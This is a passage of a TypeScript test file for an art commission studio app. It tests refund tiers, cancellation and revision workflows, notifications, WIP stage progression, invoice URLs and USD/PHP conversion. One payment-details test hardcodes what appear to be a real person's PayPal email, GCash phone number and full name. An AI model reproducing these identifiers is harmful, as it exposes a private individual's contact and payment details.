  it('maps both canonical storage paths and Base64 Data URLs cleanly into SubmittedOrder references', () => {
    const mockRow: CommissionRow = {
      id: 'comm-1234',
      order_code: 'MRU-TEST01',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      client_id: 'client-5678',
      client_handle: 'artist_fan',
      tier: 'fullbody',
      character_count: 1,
      addons: { nsfw: false, softFurry: false, commercial: false },
      currency: 'USD',
      payment_split: '50_50',
      total_price: 40,
      deposit_due: 20,
      deposit_paid: false,
      final_paid: false,
      status_stage: 'pending_review',
      progress: 0,
      character_name: 'Luna',
      pose_and_vibe: 'Happy pose',
      background_notes: 'None',
      start_date: null,
      est_end_date: null,
      tos_accepted_at: new Date().toISOString(),
      reference_urls: [
        'client-5678/comm-1234/1730000000-hero_sheet.png',
        'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD',
      ],
    };

    const submitted = mapCommissionRowToSubmitted(mockRow);
    expect(submitted.references).toHaveLength(2);

    // Canonical path extracts clean filename
    expect(submitted.references[0].name).toBe('hero_sheet.png');
    expect(submitted.references[0].previewUrl).toBe('client-5678/comm-1234/1730000000-hero_sheet.png');

    // Data URL assigns readable Reference index label without truncation
    expect(submitted.references[1].name).toBe('Reference #2');
    expect(submitted.references[1].previewUrl).toMatch(/^data:image\/jpeg;base64,/);
  });
});

describe('Client Cancellation & Refund Confirmation Workflow', () => {
  it('calculates refund amounts and communicates the 3-5 business day timeline per TOS', () => {
    // Pre-production stage (before sketching): 100% refund of deposit
    const preProd = getRefundTierInfo('awaiting_deposit', 40, 20, true, false);
    expect(preProd.percentage).toBe('100% Full Refund');
    expect(preProd.refundAmount).toBe(20);
    expect(preProd.processingDays).toBe('3–5 business days');

    // Sketching stage: 50% refund
    const sketch = getRefundTierInfo('sketching', 40, 20, true, false);
    expect(sketch.percentage).toBe('50% Refund');
    expect(sketch.refundAmount).toBe(10);
    expect(sketch.processingDays).toBe('3–5 business days');

    // Final production stage: non-refundable
    const lineart = getRefundTierInfo('lineart_coloring', 40, 20, true, true);
    expect(lineart.percentage).toBe('0% Non-Refundable');
    expect(lineart.refundAmount).toBe(0);
  });

  it('correctly detects pending cancellation requests from messages', () => {
    const baseOrder: SubmittedOrder = {
      id: 'comm-cancel-test',
      tier: 'fullbody',
      characterCount: 1,
      addons: { nsfw: false, softFurry: false, commercial: false },
      currency: 'USD',
      paymentSplit: '50_50',
      preferredStartDate: null,
      characterName: 'Aria',
      poseAndVibe: 'Cool pose',
      backgroundNotes: '',
      clientContact: 'client@example.com',
      references: [],
      tosAccepted: true,
      tosAcceptedAt: new Date().toISOString(),
      createdAt: new Date().toISOString(),
      totalUsd: 40,
      depositUsd: 20,
      depositPaid: true,
      finalPaid: false,
      sketchApproved: false,
      stage: 'sketching',
      progress: 30,
      authMethod: 'google',
      wips: [],
      messages: [
        {
          id: 'm1',
          commissionId: 'comm-cancel-test',
          senderRole: 'client',
          senderName: 'Client',
          body: 'Hello Meru!',
          createdAt: '2026-11-03T08:00:00Z',
        },
      ],
    };

    // No cancellation request initially
    expect(getActiveCancellationRequest(baseOrder).hasRequest).toBe(false);
    expect(getActiveCancellationRequest(baseOrder).status).toBe('none');

    // Client submits cancellation request with valid reason
    const withCancelReq: SubmittedOrder = {
      ...baseOrder,
      messages: [
        ...baseOrder.messages,
        {
          id: 'm2',
          commissionId: 'comm-cancel-test',
          senderRole: 'client',
          senderName: 'Client',
          body: '[Cancellation Request]: Unexpected financial emergency, cannot proceed with commission.',
          createdAt: '2026-11-03T09:00:00Z',
        },
      ],
    };

    const cancelInfo = getActiveCancellationRequest(withCancelReq);
    expect(cancelInfo.hasRequest).toBe(true);
    expect(cancelInfo.status).toBe('pending');
    expect(cancelInfo.reason).toBe('Unexpected financial emergency, cannot proceed with commission.');

    // Artist declines cancellation
    const withDeclinedCancel: SubmittedOrder = {
      ...withCancelReq,
      messages: [
        ...withCancelReq.messages,
        {
          id: 'm3',
          commissionId: 'comm-cancel-test',
          senderRole: 'artist',
          senderName: 'Meru Art',
          body: '[Cancellation Declined]: Artwork has already progressed past sketch phase.',
          createdAt: '2026-11-03T10:00:00Z',
        },
      ],
    };

    const declinedInfo = getActiveCancellationRequest(withDeclinedCancel);
    expect(declinedInfo.hasRequest).toBe(false);
    expect(declinedInfo.status).toBe('declined');
    expect(declinedInfo.declineReason).toBe('Artwork has already progressed past sketch phase.');
  });
});

describe('Relative Time Formatter (formatRelativeTime)', () => {
  it('formats recent timestamps into friendly relative strings', () => {
    const now = Date.now();
    expect(formatRelativeTime(new Date(now - 10 * 1000).toISOString())).toBe('Just now');
    expect(formatRelativeTime(new Date(now - 45 * 1000).toISOString())).toBe('45s ago');
    expect(formatRelativeTime(new Date(now - 5 * 60 * 1000).toISOString())).toBe('5m ago');
    expect(formatRelativeTime(new Date(now - 3 * 3600 * 1000).toISOString())).toBe('3h ago');
    expect(formatRelativeTime(new Date(now - 2 * 86400 * 1000).toISOString())).toBe('2d ago');
  });

  it('handles empty or invalid date gracefully', () => {
    expect(formatRelativeTime('')).toBe('');
    expect(formatRelativeTime('invalid-date')).toBe('invalid-date');
  });
});

describe('Phase 8 Activity Feed & Notification Engine (deriveStudioNotifications)', () => {
  const baseOrder: SubmittedOrder = {
    id: 'ord-101',
    orderCode: 'MRU-0101',
    tier: 'fullbody',
    characterCount: 1,
    addons: { nsfw: false, softFurry: false, commercial: false },
    currency: 'USD',
    paymentSplit: '50_50',
    characterName: 'Kitsune OC',
    poseAndVibe: 'Playful in autumn leaves',
    backgroundNotes: 'Transparent',
    clientContact: 'client@example.com',
    preferredStartDate: '2026-11-10',
    totalUsd: 40,
    depositUsd: 20,
    remainingUsd: 20,
    stage: 'pending_review',
    progress: 0,
    depositPaid: false,
    finalPaid: false,
    createdAt: '2026-11-03T10:00:00Z',
    updatedAt: '2026-11-03T10:00:00Z',
    authMethod: 'google',
    wips: [],
    messages: [],
  };

  it('derives artist admin notifications for incoming briefs, cancellation requests, and payments', () => {
    const orderWithCancelAndReceipt: SubmittedOrder = {
      ...baseOrder,
      stage: 'awaiting_deposit',
      messages: [
        {
          id: 'msg-rcpt',
          commissionId: 'ord-101',
          senderRole: 'client',
          senderName: 'Client',
          body: 'Here is my deposit receipt proof!',
          attachmentKind: 'receipt',
          attachmentUrl: 'https://example.com/receipt.jpg',
          createdAt: '2026-11-03T11:00:00Z',
        },
        {
          id: 'msg-cancel',
          commissionId: 'ord-101',
          senderRole: 'client',
          senderName: 'Client',
          body: '[Cancellation Request]: Emergency reason for cancelling order please.',
          createdAt: '2026-11-03T12:00:00Z',
        },
      ],
    };

    const adminNotifications = deriveStudioNotifications(
      [baseOrder, orderWithCancelAndReceipt],
      true, // isArtistAdmin
      new Set(['brief-ord-101']), // already read the first brief
    );

    // 1. Check brief notification
    const briefNotif = adminNotifications.find((n) => n.id === 'brief-ord-101');
    expect(briefNotif).toBeDefined();
    expect(briefNotif?.type).toBe('brief_submitted');
    expect(briefNotif?.targetTab).toBe('admin');
    expect(briefNotif?.targetSubTab).toBe('briefs');
    expect(briefNotif?.isRead).toBe(true);

    // 2. Check cancellation request notification
    const cancelNotif = adminNotifications.find((n) => n.id === 'cancel-ord-101');
    expect(cancelNotif).toBeDefined();
    expect(cancelNotif?.type).toBe('cancellation_requested');
    expect(cancelNotif?.targetTab).toBe('admin');
    expect(cancelNotif?.targetSubTab).toBe('pipeline');
    expect(cancelNotif?.isRead).toBe(false);

    // 3. Check payment receipt awaiting verification notification
    const pmtNotif = adminNotifications.find((n) => n.id === 'pmt-ord-101');
    expect(pmtNotif).toBeDefined();
    expect(pmtNotif?.type).toBe('payment_submitted');
    expect(pmtNotif?.targetTab).toBe('admin');
    expect(pmtNotif?.targetSubTab).toBe('payments');
  });

  it('derives client notifications for accepted briefs, verified deposits, WIP uploads, and stage updates', () => {
    const clientOrder: SubmittedOrder = {
      ...baseOrder,
      stage: 'sketch_approval',
      depositPaid: true,
      progress: 40,
      wips: [
        {
          id: 'wip-1',
          commissionId: 'ord-101',
          title: 'Thumbnail Composition #1',
          imageUrl: 'https://example.com/wip1.jpg',
          isFinal: false,
          artistNote: 'Let me know what you think of this pose!',
          createdAt: '2026-11-03T14:00:00Z',
        },
      ],
      messages: [
        {
          id: 'msg-artist',
          commissionId: 'ord-101',
          senderRole: 'artist',
          senderName: 'Meru Art',
          body: 'Working on your rough pencil pass right now!',
          createdAt: '2026-11-03T15:00:00Z',
        },
      ],
    };

    const clientNotifications = deriveStudioNotifications(
      [clientOrder],
      false, // client view
      new Set(),
    );

    // Should include: payment_verified, wip_posted, stage_updated, message_received
    const types = clientNotifications.map((n) => n.type);
    expect(types).toContain('payment_verified');
    expect(types).toContain('wip_posted');
    expect(types).toContain('stage_updated');
    expect(types).toContain('message_received');

    // All client notifications target the track tab
    for (const notif of clientNotifications) {
      expect(notif.targetTab).toBe('track');
    }

    // Newest notifications are sorted first
    expect(clientNotifications[0].createdAt >= clientNotifications[clientNotifications.length - 1].createdAt).toBe(true);
  });
});

describe('WIP Pipeline Workflow & Stage Preservation (calculateNextWipStageAndProgress)', () => {
  it('advances from sketching to sketch_approval when initial sketch WIP is uploaded', () => {
    const next = calculateNextWipStageAndProgress('sketching', 42, {
      isFinal: false,
    });
    expect(next.stage).toBe('sketch_approval');
    expect(next.progress).toBe(62);
  });

  it('keeps order in sketch_approval when subsequent WIP is uploaded in sketch phase', () => {
    const next = calculateNextWipStageAndProgress('sketch_approval', 62, {
      isFinal: false,
    });
    expect(next.stage).toBe('sketch_approval');
    expect(next.progress).toBe(62);
  });

  it('PRESERVES lineart_coloring stage (NEVER reverts backwards to sketch_approval) when WIP is uploaded', () => {
    // 1. Lineart WIP uploaded in stage 5
    const lineartNext = calculateNextWipStageAndProgress('lineart_coloring', 85, {
      isFinal: false,
    });
    expect(lineartNext.stage).toBe('lineart_coloring');
    expect(lineartNext.progress).toBe(88);

    // 2. Base Colors WIP uploaded in stage 5
    const colorNext = calculateNextWipStageAndProgress('lineart_coloring', 88, {
      isFinal: false,
      stage: 'lineart_coloring',
      progress: 90,
    });
    expect(colorNext.stage).toBe('lineart_coloring');
    expect(colorNext.progress).toBe(90);

    // 3. Shading & Highlights WIP uploaded in stage 5
    const shadingNext = calculateNextWipStageAndProgress('lineart_coloring', 90, {
      isFinal: false,
      stage: 'lineart_coloring',
      progress: 94,
    });
    expect(shadingNext.stage).toBe('lineart_coloring');
    expect(shadingNext.progress).toBe(94);

    // 4. Final Retouches WIP uploaded in stage 5
    const retouchesNext = calculateNextWipStageAndProgress('lineart_coloring', 94, {
      isFinal: false,
      stage: 'lineart_coloring',
      progress: 96,
    });
    expect(retouchesNext.stage).toBe('lineart_coloring');
    expect(retouchesNext.progress).toBe(96);
  });

  it('transitions to completed (100%) when final master is marked', () => {
    const finalNext = calculateNextWipStageAndProgress('lineart_coloring', 95, {
      isFinal: true,
    });
    expect(finalNext.stage).toBe('completed');
    expect(finalNext.progress).toBe(100);
  });
});

describe('Phase 8 Admin Navigation & Chat Bubble UX Enhancements', () => {
  it('verifies the concise 6-item Admin Nav labels for compact stacked sidebar and mobile bottom bar', () => {
    const expectedSubTabs: AdminSubTab[] = ['inbox', 'pipeline', 'briefs', 'payments', 'settings', 'archive'];
    const shortLabels: Record<AdminSubTab, string> = {
      inbox: 'Inbox',
      pipeline: 'Pipeline',
      briefs: 'Briefs',
      payments: 'Payments',
      settings: 'Settings',
      archive: 'Archive',
    };

    expect(expectedSubTabs).toHaveLength(6);
    expectedSubTabs.forEach((tab) => {
      expect(shortLabels[tab]).toBeDefined();
      expect(shortLabels[tab].length).toBeLessThanOrEqual(8);
      // Ensure none of the short labels have messy conjunctions
      expect(shortLabels[tab]).not.toContain('&');
    });
  });

  it('verifies chat message perspective rules for artist admin vs client', () => {
    interface MockMessage {
      id: string;
      senderRole: 'client' | 'artist';
      body: string;
    }

    const messages: MockMessage[] = [
      { id: '1', senderRole: 'client', body: 'Hi Meru! Here is my reference.' },
      { id: '2', senderRole: 'artist', body: 'Got it! Starting on your rough sketch.' },
    ];

    // 1. From Artist Admin perspective:
    const artistUnreadCount = messages.filter((m) => m.senderRole === 'client').length;
    expect(artistUnreadCount).toBe(1);

    const isSelfArtist = (m: MockMessage) => m.senderRole === 'artist';
    expect(isSelfArtist(messages[0])).toBe(false); // client message on left
    expect(isSelfArtist(messages[1])).toBe(true);  // artist message on right

    // 2. From Client perspective:
    const clientUnreadCount = messages.filter((m) => m.senderRole === 'artist').length;
    expect(clientUnreadCount).toBe(1);

    const isSelfClient = (m: MockMessage) => m.senderRole !== 'artist';
    expect(isSelfClient(messages[0])).toBe(true);  // client message on right
    expect(isSelfClient(messages[1])).toBe(false); // artist message on left
  });

  it('validates default studio payment details configuration and conversion logic', () => {
    expect(DEFAULT_PAYMENT_DETAILS.paypalEmail).toBe('mkun.arts@gmail.com');
    expect(DEFAULT_PAYMENT_DETAILS.gcashNumber).toBe('09455121351');
    expect(DEFAULT_PAYMENT_DETAILS.gcashName).toBe('Mhelric Banaag');
    expect(DEFAULT_PAYMENT_DETAILS.gcashQrImageUrl).toBe('/brand/gcash-qr.png');
    expect(DEFAULT_PAYMENT_DETAILS.bankAccountNumber.length).toBeGreaterThanOrEqual(10);

    // Test conversion at studio exchange rate (e.g. 58 PHP/USD)
    const usdAmount = 40;
    const rate = 58;
    const phpAmount = Math.round(usdAmount * rate);
    expect(phpAmount).toBe(2320);

    // Test deposit milestone vs remaining milestone split (50/50)
    const depositUsd = Math.ceil(usdAmount / 2);
    const remainingUsd = usdAmount - depositUsd;
    expect(depositUsd).toBe(20);
    expect(remainingUsd).toBe(20);
  });

  it('validates 1-click PayPal generated invoice URL and GCash invoice parameters', () => {
    const orderCode = '59A2C3';
    const amountUsd = 20;
    const rate = 58;
    const amountPhp = Math.round(amountUsd * rate);
    const invoiceNo = `INV-MRU-${orderCode}-DEP`;

    // 1-Click PayPal Direct Checkout URL construction
    const paypalUrl = `https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&business=${encodeURIComponent(
      DEFAULT_PAYMENT_DETAILS.paypalEmail,
    )}&item_name=${encodeURIComponent(`Meru Art Studio - Invoice #${invoiceNo}`)}&amount=${amountUsd.toFixed(2)}&currency_code=USD&no_shipping=1&invoice=${encodeURIComponent(invoiceNo)}`;

    expect(paypalUrl).toContain('cmd=_xclick');
    expect(paypalUrl).toContain('business=mkun.arts%40gmail.com');
    expect(paypalUrl).toContain('amount=20.00');
    expect(paypalUrl).toContain('currency_code=USD');
    expect(paypalUrl).toContain('invoice=INV-MRU-59A2C3-DEP');

    // GCash Invoice parameters
    expect(amountPhp).toBe(1160);
    const gcashData = `GCASH:${DEFAULT_PAYMENT_DETAILS.gcashNumber} | Invoice: ${invoiceNo} | Payee: ${DEFAULT_PAYMENT_DETAILS.gcashName} | Amount: PHP ${amountPhp} | Memo: #${orderCode}`;
    expect(gcashData).toContain('09455121351');
    expect(gcashData).toContain('Mhelric Banaag');
    expect(gcashData).toContain('PHP 1160');
    expect(gcashData).toContain('INV-MRU-59A2C3-DEP');

    // Test invoice code deduplication (prevent INV-MRU-MRU-XXXXX bug)
    const orderWithPrefix = 'MRU-D969B5';
    const clean = orderWithPrefix.replace(/^MRU-/, '');
    const cleanInvoiceNo = `INV-MRU-${clean}-DEP`;
    expect(cleanInvoiceNo).toBe('INV-MRU-D969B5-DEP');
    expect(cleanInvoiceNo).not.toContain('MRU-MRU');
  });
});

describe('Formal Revision Allowance & Milestone Sign-off System', () => {
  const dummyOrder: SubmittedOrder = {
    id: 'comm-rev-test-1',
    orderCode: 'REV001',
    tier: 'fullbody',
    characterCount: 1,
    characterName: 'Aria',
    poseAndVibe: 'Dynamic stance with staff',
    backgroundNotes: 'Soft pastel background',
    clientContact: 'aria.fan@example.com',
    addons: { nsfw: false, softFurry: false, commercial: false },
    currency: 'USD',
    paymentSplit: '50_50',
    totalUsd: 40,
    depositUsd: 20,
    remainingUsd: 20,
    multiplier: 1,
    stage: 'lineart_coloring',
    createdAt: '2026-11-04T00:00:00.000Z',
    updatedAt: '2026-11-04T00:00:00.000Z',
    preferredStartDate: null,
    estimatedStartDate: '2026-11-05',
    estimatedDeliveryDate: '2026-11-15',
    progress: 40,
    references: [],
    wips: [],
    messages: [],
    payments: [],
    tosAccepted: true,
    tosAcceptedAt: '2026-11-04T00:00:00.000Z',
  };

  it('calculates default revision allowance correctly with 0, 1, and 2 rounds', () => {
    expect(DEFAULT_MAX_REVISIONS).toBe(2);

    // 0 revisions used
    const allowance0 = getRevisionAllowance(dummyOrder);
    expect(allowance0.maxAllowed).toBe(2);
    expect(allowance0.usedCount).toBe(0);
    expect(allowance0.remainingCount).toBe(2);
    expect(allowance0.isExhausted).toBe(false);
    expect(allowance0.canRequestFree).toBe(true);

    // 1 revision used
    const order1: SubmittedOrder = {
      ...dummyOrder,
      messages: [
        {
          id: 'msg-1',
          sender: 'Client',
          senderRole: 'client',
          body: '[Revision Request · Pose Adjustment]: Could we adjust the angle of her left arm?',
          createdAt: '2026-11-04T01:00:00.000Z',
        },
      ],
    };
    const allowance1 = getRevisionAllowance(order1);
    expect(allowance1.usedCount).toBe(1);
    expect(allowance1.remainingCount).toBe(1);
    expect(allowance1.isExhausted).toBe(false);
    expect(allowance1.canRequestFree).toBe(true);

    // 2 revisions used (all included rounds consumed)
    const order2: SubmittedOrder = {
      ...order1,
      messages: [
        ...order1.messages,
        {
          id: 'msg-2',
          sender: 'Client',
          senderRole: 'client',
          body: '[Revision Request · Expression]: Make the smile slightly wider please.',
          createdAt: '2026-11-04T02:00:00.000Z',
        },
      ],
    };
    const allowance2 = getRevisionAllowance(order2);
    expect(allowance2.usedCount).toBe(2);
    expect(allowance2.remainingCount).toBe(0);
    expect(allowance2.isExhausted).toBe(true);
    expect(allowance2.canRequestFree).toBe(false);
  });

  it('provides unlimited free revisions during sketch phase without limit exhaustion', () => {
    const sketchOrder: SubmittedOrder = {
      ...dummyOrder,
      stage: 'sketch_approval',
      messages: [
        {
          id: 'msg-sk-1',
          sender: 'Client',
          senderRole: 'client',
          body: '[Revision Request · Sketch Pass · Pose]: Can we try a more dynamic hand gesture?',
          createdAt: '2026-11-04T01:00:00.000Z',
        },
        {
          id: 'msg-sk-2',
          sender: 'Client',
          senderRole: 'client',
          body: '[Revision Request · Sketch Pass · Anatomy]: Adjust the head tilt slightly.',
          createdAt: '2026-11-04T02:00:00.000Z',
        },
      ],
    };

    const allowance = getRevisionAllowance(sketchOrder);
    expect(allowance.isSketchPhase).toBe(true);
    expect(allowance.isUnlimitedFree).toBe(true);
    expect(allowance.canRequestFree).toBe(true);
    expect(allowance.isExhausted).toBe(false);
    expect(allowance.remainingCount).toBe(Infinity);
  });

  it('supports custom artist-granted maxRevisions bonus rounds', () => {
    const bonusOrder: SubmittedOrder = {
      ...dummyOrder,
      maxRevisions: 3,
      messages: [
        {
          id: 'msg-1',
          sender: 'Client',
          senderRole: 'client',
          body: '[Revision Request · Hair]: Tweak the bangs',
          createdAt: '2026-11-04T01:00:00.000Z',
        },
        {
          id: 'msg-2',
          sender: 'Client',
          senderRole: 'client',
          body: '[Revision Request · Eyes]: Make eyes a bit larger',
          createdAt: '2026-11-04T02:00:00.000Z',
        },
      ],
    };
    const allowance = getRevisionAllowance(bonusOrder);
    expect(allowance.maxAllowed).toBe(3);
    expect(allowance.usedCount).toBe(2);
    expect(allowance.remainingCount).toBe(1);
    expect(allowance.isExhausted).toBe(false);
    expect(allowance.canRequestFree).toBe(true);
  });

  it('parses structured revision messages and flags extra fee rounds', () => {
    const orderWithHistory: SubmittedOrder = {
      ...dummyOrder,
      messages: [
        {
          id: 'msg-sys',
          sender: 'Meru Art Studio',
          senderRole: 'system',
          body: 'Order received and confirmed.',
          createdAt: '2026-11-04T00:00:00.000Z',
        },
        {
          id: 'msg-rev-1',
          sender: 'Client',
          senderRole: 'client',
          body: '[Revision Request · Pose & Anatomy]: Adjust the left arm angle.',
          createdAt: '2026-11-04T01:00:00.000Z',
        },
        {
          id: 'msg-rev-2',
          sender: 'Client',
          senderRole: 'client',
          body: '[Revision Request · Character Details]: Add ribbon to the staff.',
          createdAt: '2026-11-04T02:00:00.000Z',
        },
        {
          id: 'msg-rev-3',
          sender: 'Client',
          senderRole: 'client',
          body: '[Revision Request · Minor Tweaks]: Please tweak the expression.',
          createdAt: '2026-11-04T03:00:00.000Z',
        },
      ],
    };

    const history = parseRevisionHistory(orderWithHistory);
    expect(history.length).toBe(3);

    expect(history[0].roundNumber).toBe(1);
    expect(history[0].category).toBe('Pose & Anatomy');
    expect(history[0].notes).toBe('Adjust the left arm angle.');
    expect(history[0].isExtraFee).toBe(false);

    expect(history[1].roundNumber).toBe(2);
    expect(history[1].category).toBe('Character Details');
    expect(history[1].notes).toBe('Add ribbon to the staff.');
    expect(history[1].isExtraFee).toBe(false);

    // 3rd round exceeds the default 2 rounds -> flagged as extra fee round
    expect(history[2].roundNumber).toBe(3);
    expect(history[2].category).toBe('Minor Tweaks');
    expect(history[2].isExtraFee).toBe(true);
  });

  it('validates 3-point milestone sign-off checklist gate', () => {
    expect(
      isSignoffComplete({
        poseAndComposition: false,
        characterAndDetails: false,
        termsAcknowledged: false,
      }),
    ).toBe(false);

    expect(
      isSignoffComplete({
        poseAndComposition: true,
        characterAndDetails: true,
        termsAcknowledged: false,
      }),
    ).toBe(false);

    expect(
      isSignoffComplete({
        poseAndComposition: true,
        characterAndDetails: true,
        termsAcknowledged: true,
      }),
    ).toBe(true);
  });

  it('accurately resolves order milestone sign-off status from order fields and approved WIPs', () => {
    // Unsigned order
    const unsigned = getOrderSignoffStatus(dummyOrder);
    expect(unsigned.isSignedOff).toBe(false);
    expect(unsigned.signedOffAt).toBeNull();

    // Order with explicit sketchSignedOffAt
    const signedExplicit: SubmittedOrder = {
      ...dummyOrder,
      sketchSignedOffAt: '2026-11-04T04:00:00.000Z',
    };
    const signedStatus1 = getOrderSignoffStatus(signedExplicit);
    expect(signedStatus1.isSignedOff).toBe(true);
    expect(signedStatus1.signedOffAt).toBe('2026-11-04T04:00:00.000Z');

    // Order with approved WIP
    const signedWip: SubmittedOrder = {
      ...dummyOrder,
      wips: [
        {
          id: 'wip-sketch-1',
          title: 'Rough Composition Sketch #1',
          stage: 'sketch_approval',
          notes: 'Here is the pose sketch',
          approvedByClient: true,
          createdAt: '2026-11-04T03:30:00.000Z',
        },
      ],
    };
    const signedStatus2 = getOrderSignoffStatus(signedWip);
    expect(signedStatus2.isSignedOff).toBe(true);
    expect(signedStatus2.signedOffWipTitle).toBe('Rough Composition Sketch #1');
    expect(signedStatus2.signedOffAt).toBe('2026-11-04T03:30:00.000Z');
  });

  it('validates High-Res Master Vault filename generation and 1-click Tip URL construction', () => {
    const displayCode = 'REV001';
    const tier = 'fullbody';
    const expectedFilename = `MeruArt-${displayCode}-${tier}-Master-300DPI.png`;
    expect(expectedFilename).toBe('MeruArt-REV001-fullbody-Master-300DPI.png');

    // 1-Click PayPal tip URL construction
    const tipAmount = 15;
    const paypalTipUrl = `https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&business=${encodeURIComponent(
      DEFAULT_PAYMENT_DETAILS.paypalEmail,
    )}&item_name=${encodeURIComponent(`Meru Art Studio - Tip for #${displayCode}`)}&amount=${tipAmount.toFixed(2)}&currency_code=USD&no_shipping=1`;

    expect(paypalTipUrl).toContain('cmd=_xclick');
    expect(paypalTipUrl).toContain('business=mkun.arts%40gmail.com');
    expect(paypalTipUrl).toContain('amount=15.00');
    expect(paypalTipUrl).toContain('Meru%20Art%20Studio%20-%20Tip%20for%20%23REV001');
  });
});

describe('Multi-Currency Engine & Auto-Detection', () => {
  it('converts USD to PHP accurately with default and custom exchange rates', () => {
    // Default rate (58)
    expect(convertUsdToPhp(40, 58)).toBe(2320);
    expect(convertUsdToPhp(15, 58)).toBe(870);
    expect(convertUsdToPhp(25, 58)).toBe(1450);

    // Custom rate (60)
    expect(convertUsdToPhp(40, 60)).toBe(2400);
    expect(convertUsdToPhp(10, 60)).toBe(600);
  });

  it('converts PHP to USD accurately', () => {
    expect(convertPhpToUsd(2320, 58)).toBe(40);
    expect(convertPhpToUsd(2400, 60)).toBe(40);
  });

  it('formats dual-currency display strings for storefront pricing cards', () => {
    // When active currency is USD
    const usdView = formatDualCurrency(40, 'USD', 58);
    expect(usdView.primary).toBe('$40');
    expect(usdView.secondary).toBe('≈ ₱2,320');
    expect(usdView.full).toBe('$40 (≈ ₱2,320)');

    // When active currency is PHP
    const phpView = formatDualCurrency(40, 'PHP', 58);
    expect(phpView.primary).toBe('₱2,320');
    expect(phpView.secondary).toBe('≈ $40 USD');
    expect(phpView.full).toBe('₱2,320 (≈ $40 USD)');
  });

  it('persists currency preference and prioritizes saved selection', () => {
    const store: Record<string, string> = {};
    const mockStorage = {
      getItem: (k: string) => store[k] ?? null,
      setItem: (k: string, v: string) => {
        store[k] = v;
      },
      removeItem: (k: string) => {
        delete store[k];
      },
      clear: () => {
        Object.keys(store).forEach((k) => delete store[k]);
      },
    };
    const prevStorage = (globalThis as any).localStorage;
    const prevWindow = (globalThis as any).window;
    (globalThis as any).localStorage = mockStorage;
    (globalThis as any).window = globalThis;

    try {
      saveCurrencyPreference('PHP');
      expect(mockStorage.getItem(CURRENCY_PREF_KEY)).toBe('PHP');
      expect(detectClientCurrency()).toBe('PHP');

      saveCurrencyPreference('USD');
      expect(mockStorage.getItem(CURRENCY_PREF_KEY)).toBe('USD');
      expect(detectClientCurrency()).toBe('USD');
    } finally {
      (globalThis as any).localStorage = prevStorage;
      (globalThis as any).window = prevWindow;
    }
  });

  it('formats money with custom studio exchange rate', () => {
    expect(formatMoney(40, 'USD', 60)).toBe('$40');
    expect(formatMoney(40, 'PHP', 60)).toBe('₱2,400');
    expect(formatMoney(40, 'PHP', 58)).toBe('₱2,320');
  });

  it('validates redline markup filename formatting and structured chat log generation', () => {
    const orderCode = 'D969B5';
    const wipTitle = 'Rough Pose Sketch #1';
    const cleanTitle = wipTitle.replace(/[^a-zA-Z0-9_-]/g, '_');
    expect(cleanTitle).toBe('Rough_Pose_Sketch__1');

    const fileName = `Redline-${orderCode}-${cleanTitle}-12345.png`;
    expect(fileName).toBe('Redline-D969B5-Rough_Pose_Sketch__1-12345.png');

    const roundNumber = 2;
    const maxAllowed = 2;
    const category = 'Pose & Gesture';
    const notes = 'Adjust arm position and shoulder height';
    const roundTag = `Round ${roundNumber}/${maxAllowed}`;
    const messageBody = `[Revision Request · ${roundTag} · ${category}]: ${notes}`;

    expect(messageBody).toBe('[Revision Request · Round 2/2 · Pose & Gesture]: Adjust arm position and shoulder height');
    expect(messageBody).toContain('[Revision Request');
  });
});

describe('Reference Image Upload & Persistence Pipeline', () => {
  it('resolves raw File objects preserving filename and binary object', async () => {
    const mockFile = new File(['mock image content'], 'character_ref_1.png', { type: 'image/png' });
    const ref = {
      id: 'ref-1',
      name: 'character_ref_1.png',
      sizeBytes: 1024,
      previewUrl: 'blob:http://localhost:5173/mock-uuid',
      file: mockFile,
    };

    const resolved = await resolveReferenceToUploadable(ref);
    expect(resolved.file).toBe(mockFile);
    expect(resolved.filename).toBe('character_ref_1.png');
  });

  it('resolves base64 data URLs reconstructed from post-OAuth restore', async () => {
    // 1x1 transparent PNG data URL
    const dataUrl = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';
    const ref = {
      id: 'ref-oauth',
      name: 'outfit_reference.png',
      sizeBytes: 68,
      previewUrl: dataUrl,
    };

    const resolved = await resolveReferenceToUploadable(ref);
    expect(resolved.file).toBeInstanceOf(File);
    expect(resolved.filename).toBe('outfit_reference.png');
    expect((resolved.file as File).type).toBe('image/png');
  });

  it('maps commission row reference_urls into formatted references with clean names', () => {
    const mockRow: Partial<CommissionRow> = {
      id: '123e4567-e89b-12d3-a456-426614174000',
      client_id: 'client-uuid-1',
      client_handle: 'artist_fan',
      tier: 'fullbody',
      character_count: 1,
      addons: { nsfw: false, softFurry: false, commercial: false },
      currency: 'USD',
      payment_split: '50_50',
      total_price: 100,
      deposit_due: 50,
      status_stage: 'pending_review',
      character_name: 'Aria',
      pose_and_vibe: 'Dynamic action pose',
      background_notes: 'Transparent',
      reference_urls: [
        'client-uuid-1/123e4567-e89b-12d3-a456-426614174000/173000000-aria_costume.png',
        'client-uuid-1/123e4567-e89b-12d3-a456-426614174000/173000001-hair_palette.png',
      ],
      tos_accepted_at: '2026-11-04T00:00:00Z',
    };

    const mapped = mapCommissionRowToSubmitted(mockRow as CommissionRow);
    expect(mapped.references).toHaveLength(2);
    expect(mapped.references[0].name).toBe('aria_costume.png');
    expect(mapped.references[0].previewUrl).toBe('client-uuid-1/123e4567-e89b-12d3-a456-426614174000/173000000-aria_costume.png');
    expect(mapped.references[1].name).toBe('hair_palette.png');
  });

  it('handles empty or null reference_urls safely without throwing', () => {
    const mockRow: Partial<CommissionRow> = {
      id: '123e4567-e89b-12d3-a456-426614174000',
      client_id: 'client-uuid-1',
      client_handle: 'artist_fan',
      tier: 'bust',
      character_count: 1,
      addons: { nsfw: false, softFurry: false, commercial: false },
      currency: 'USD',
      payment_split: '50_50',
      total_price: 50,
      deposit_due: 25,
      status_stage: 'pending_review',
      character_name: 'Ren',
      pose_and_vibe: 'Calm',
      background_notes: '',
      reference_urls: [],
      tos_accepted_at: '2026-11-04T00:00:00Z',
    };

    const mapped = mapCommissionRowToSubmitted(mockRow as CommissionRow);
    expect(mapped.references).toEqual([]);
  });
});






